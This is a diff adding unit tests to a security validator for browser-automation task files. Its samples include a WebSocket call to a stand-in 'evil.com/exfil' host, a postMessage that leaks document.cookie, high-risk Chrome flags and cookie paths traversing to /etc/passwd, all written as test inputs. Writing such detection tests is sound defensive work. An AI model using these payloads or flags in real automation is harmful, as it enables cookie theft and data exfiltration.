@@ -2690,6 +2690,184 @@ tasks:
       });
       assert.equal(jsWarnings.length, 0, 'Should not warn on safe javascript');
     });
+
+    it('warns on WebSocket pattern in javascript step', () => {
+      const yaml = `
+web:
+  url: "https://example.com"
+tasks:
+  - name: test
+    flow:
+      - javascript: "new WebSocket('ws://evil.com/exfil')"
+`;
+      const result = validate(yaml);
+      const jsWarnings = result.warnings.filter(w => {
+        const msg = typeof w === 'object' ? w.message : w;
+        return msg.includes('dangerous code pattern') || msg.includes('require/eval/exec');
+      });
+      assert.ok(jsWarnings.length > 0, 'Should warn about WebSocket in javascript step');
+    });
+
+    it('warns on postMessage pattern in javascript step', () => {
+      const yaml = `
+web:
+  url: "https://example.com"
+tasks:
+  - name: test
+    flow:
+      - javascript: "window.parent.postMessage({data: document.cookie}, '*')"
+`;
+      const result = validate(yaml);
+      const jsWarnings = result.warnings.filter(w => {
+        const msg = typeof w === 'object' ? w.message : w;
+        return msg.includes('dangerous code pattern') || msg.includes('require/eval/exec');
+      });
+      assert.ok(jsWarnings.length > 0, 'Should warn about postMessage in javascript step');
+    });
+  });
+
+  describe('chromeArgs high-risk parameter detection', () => {
+    it('warns on --disable-web-security in chromeArgs', () => {
+      const yaml = `
+web:
+  url: "https://example.com"
+  chromeArgs:
+    - "--disable-web-security"
+tasks:
+  - name: test
+    flow:
+      - aiTap: "button"
+`;
+      const result = validate(yaml);
+      const chromeWarnings = result.warnings.filter(w => {
+        const msg = typeof w === 'object' ? w.message : w;
+        return msg.includes('high-risk') && msg.includes('chromeArgs');
+      });
+      assert.ok(chromeWarnings.length > 0, 'Should warn about --disable-web-security');
+    });
+
+    it('warns on --allow-file-access-from-files in chromeArgs', () => {
+      const yaml = `
+web:
+  url: "https://example.com"
+  chromeArgs:
+    - "--allow-file-access-from-files"
+tasks:
+  - name: test
+    flow:
+      - aiTap: "button"
+`;
+      const result = validate(yaml);
+      const chromeWarnings = result.warnings.filter(w => {
+        const msg = typeof w === 'object' ? w.message : w;
+        return msg.includes('high-risk') && msg.includes('chromeArgs');
+      });
+      assert.ok(chromeWarnings.length > 0, 'Should warn about --allow-file-access-from-files');
+    });
+
+    it('warns on --remote-debugging-port in chromeArgs', () => {
+      const yaml = `
+web:
+  url: "https://example.com"
+  chromeArgs:
+    - "--remote-debugging-port=9222"
+tasks:
+  - name: test
+    flow:
+      - aiTap: "button"
+`;
+      const result = validate(yaml);
+      const chromeWarnings = result.warnings.filter(w => {
+        const msg = typeof w === 'object' ? w.message : w;
+        return msg.includes('high-risk') && msg.includes('chromeArgs');
+      });
+      assert.ok(chromeWarnings.length > 0, 'Should warn about --remote-debugging-port');
+    });
+
+    it('does not warn on safe chromeArgs', () => {
+      const yaml = `
+web:
+  url: "https://example.com"
+  chromeArgs:
+    - "--headless"
+    - "--no-sandbox"
+tasks:
+  - name: test
+    flow:
+      - aiTap: "button"
+`;
+      const result = validate(yaml);
+      const chromeWarnings = result.warnings.filter(w => {
+        const msg = typeof w === 'object' ? w.message : w;
+        return msg.includes('high-risk') && msg.includes('chromeArgs');
+      });
+      assert.equal(chromeWarnings.length, 0, 'Should not warn on safe chromeArgs');
+    });
+  });
+
+  describe('cookie path traversal detection', () => {
+    it('warns on path traversal in cookie path', () => {
+      const yaml = `
+web:
+  url: "https://example.com"
+  cookie:
+    - name: "session"
+      value: "abc123"
+      path: "/../../etc/passwd"
+tasks:
+  - name: test
+    flow:
+      - aiTap: "button"
+`;
+      const result = validate(yaml);
+      const cookieWarnings = result.warnings.filter(w => {
+        const msg = typeof w === 'object' ? w.message : w;
+        return msg.includes('path traversal') && msg.includes('cookie') && !msg.includes('import');
+      });
+      assert.ok(cookieWarnings.length > 0, 'Should warn about path traversal in cookie path');
+    });
+
+    it('warns on path traversal in single cookie object', () => {
+      const yaml = `
+web:
+  url: "https://example.com"
+  cookie:
+    name: "token"
+    value: "xyz"
+    path: "/../secret"
+tasks:
+  - name: test
+    flow:
+      - aiTap: "button"
+`;
+      const result = validate(yaml);
+      const cookieWarnings = result.warnings.filter(w => {
+        const msg = typeof w === 'object' ? w.message : w;
+        return msg.includes('path traversal') && msg.includes('cookie') && !msg.includes('import');
+      });
+      assert.ok(cookieWarnings.length > 0, 'Should warn about path traversal in single cookie object');
+    });
+
+    it('does not warn on safe cookie path', () => {
+      const yaml = `
+web:
+  url: "https://example.com"
+  cookie:
+    - name: "session"
+      value: "abc123"
+      path: "/app/dashboard"
+tasks:
+  - name: test
+    flow:
+      - aiTap: "button"
+`;
+      const result = validate(yaml);
+      const cookieWarnings = result.warnings.filter(w => {
+        const msg = typeof w === 'object' ? w.message : w;
+        return msg.includes('path traversal') && msg.includes('cookie') && !msg.includes('import');
+      });
+      assert.equal(cookieWarnings.length, 0, 'Should not warn on safe cookie path');
+    });
   });
 
   describe('ADB dangerous command detection', () => {
